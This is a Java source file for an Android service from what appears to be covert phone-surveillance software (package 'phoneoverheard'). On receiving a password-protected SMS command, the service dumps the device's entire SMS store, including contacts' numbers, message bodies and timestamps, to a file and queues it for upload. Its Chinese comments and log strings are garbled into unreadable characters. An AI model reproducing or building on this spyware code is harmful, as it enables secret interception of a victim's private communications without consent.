package com.phoneoverheard.phonne;

import java.io.File;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Sendaudio;
import com.phoneoverheard.database.SendaudioService;
import com.phoneoverheard.database.SmscmdService;
import com.phoneoverheard.database.Smsmsg;
import com.phoneoverheard.database.SmsmsgService;


import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint({ "SimpleDateFormat", "HandlerLeak" })
public class duanxinService extends Service {
    private static final String TAG = "duanxinService";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
    	Log.i(TAG, "onStart called."); 
    	mylog.WrLog("i",TAG,"��ȡ���Ų�д���ļ����ϴ�����������");
		String InboxInfo = "";
        Bundle smscontent = intent.getBundleExtra("smscontent");// ����bundle��key�õ���Ӧ�Ķ���
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");        
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("duanxin").getPassword();       
        Calendar c = Calendar.getInstance();
        long datetime = 0;
        try {
        	if(contents[3].equals("") || contents[3] == null || contents[3].equals("0")){
        		datetime = 0;
        	}else{
        		c.setTime(new SimpleDateFormat("yyyyMMdd").parse(contents[3]));
        		datetime = c.getTimeInMillis();
        	}
		} catch (ParseException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
        if(contents[0].equals("cmd") && contents[1].equals("duanxin") && new FileService().MD5(contents[2]).equals(password)){
        	if(datetime>0){
	        	InboxInfo = readInboxFromData(getBaseContext(),datetime+"");
        	}else{
	        	InboxInfo = readInbox(getBaseContext());    
        	}
	    	ManagerService managerservice = new ManagerService(getBaseContext());
	    	Manager manager = managerservice.find("manager");
	    	String filedir = manager.getAudiofolder();
			String fileurl = filedir+"duanxin"+receiveTime+".txt";
			//������д��SD���ļ���
	        FileService FileService = new FileService();
			try {
		    	if(new File(filedir).exists()){
		    		FileService.saveToSDCard(filedir,"duanxin"+receiveTime+".txt", InboxInfo,getBaseContext());
		    	}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			SmsmsgService smsmsgservice = new SmsmsgService(getBaseContext());
			if(datetime>0) smsmsgservice.delete(datetime+"");
			File file = new File(fileurl);
			SendaudioService sendaudioservice = new SendaudioService(getBaseContext());
			Sendaudio sendaudio = new Sendaudio(0,file.length(),datetime+"",fileurl,"duanxin"+receiveTime+".txt");
			sendaudioservice.insert(sendaudio);
			Log.i(TAG, 0+" "+file.length()+" "+datetime+" "+fileurl);
			mylog.WrLog("i",TAG,0+" "+file.length()+" "+datetime+" "+fileurl);
			new FileService().CheckConnectInternet(file,getBaseContext());
        }else{
	        // �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "�������";
	        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
        }
		onDestroy();
    } 

    /**
     * ������������ȡ�ռ���/���������Ϣ
     * @param context Context����
     * @return smsMsgs ��ȡ���Ķ���Ϣ
     */
	@SuppressLint("SimpleDateFormat")
	public String readInbox(Context context){
        String smsMsgs = null;
        ContentResolver cr = context.getContentResolver(); 
    	Cursor cursorInbox = cr.query(Uri.parse("content://sms"),	null, null, null, null);//��ȡ������Ϣ
    	while (cursorInbox.moveToNext()) {
            //��ȡ��ϵ��ID
            //String id = cursorInbox.getString(cursorInbox.getColumnIndex(ContactsContract.Contacts._ID));
            //��ȡ��ϵ������
            String read = cursorInbox.getString(cursorInbox.getColumnIndex("read"));
            if(smsMsgs != null){
            	smsMsgs += read + " ";
            }else{
            	smsMsgs = read + " ";
            }
            String typeColumn = cursorInbox.getString(cursorInbox.getColumnIndex("type"));
            smsMsgs += typeColumn + " ";
            String dateColumn = cursorInbox.getString(cursorInbox.getColumnIndex("date"));
            if(dateColumn!=null && dateColumn!=""){
				//Date datetime = new Date(Integer.parseInt(dateColumn));
				Date datetime = new Date(Long.valueOf(dateColumn));
				SimpleDateFormat Dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String receiveTime = Dateformat.format(datetime);
				smsMsgs += receiveTime + " ";
            }   
            String phoneNumberColumn = cursorInbox.getString(cursorInbox.getColumnIndex("address"));
            smsMsgs += phoneNumberColumn + " ";
            String smsbodyColumn = cursorInbox.getString(cursorInbox.getColumnIndex("body"));
            smsMsgs += smsbodyColumn + " ";
            smsMsgs += "\n";            
        } 
		cursorInbox.close();
		return smsMsgs;
    }
    /**
     * ������������ȡ�ռ���/���������Ϣ
     * @param context Context����
     * @return smsMsgs ��ȡ���Ķ���Ϣ
     */
	@SuppressLint("SimpleDateFormat")
	public String readInboxFromData(Context context,String datetime){
        String smsMsgs = null;
        SmsmsgService smsmsgservice = new SmsmsgService(getBaseContext());
        List<Smsmsg> smsmsg = smsmsgservice.find(datetime);
        for (int i = 0; i < smsmsg.size(); i++) { 
        	Smsmsg p = smsmsg.get(i); 
            int read = p.getRead();
            if(smsMsgs != null){
            	smsMsgs += read + " ";
            }else{
            	smsMsgs = read + " ";
            }
            int typeColumn = p.getType();
            smsMsgs += typeColumn + " ";
            String dateColumn = p.getDatetime();
            if(dateColumn!=null && dateColumn!=""){
				Date newdatetime = new Date(Long.valueOf(dateColumn));
				SimpleDateFormat Dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String receiveTime = Dateformat.format(newdatetime);
				smsMsgs += receiveTime + " ";
            }   
            String phoneNumberColumn = p.getAddress();
            smsMsgs += phoneNumberColumn + " ";
            String smsbodyColumn = p.getBody();
            smsMsgs += smsbodyColumn + " ";
            smsMsgs += "\n"; 
        } 
        Log.i(TAG, "�ܹ�"+smsmsg.size()+"����¼\n"+smsMsgs); 
        mylog.WrLog("i",TAG,"�ܹ�"+smsmsg.size()+"����¼\n"+smsMsgs);
		return smsMsgs;
    }
	
}
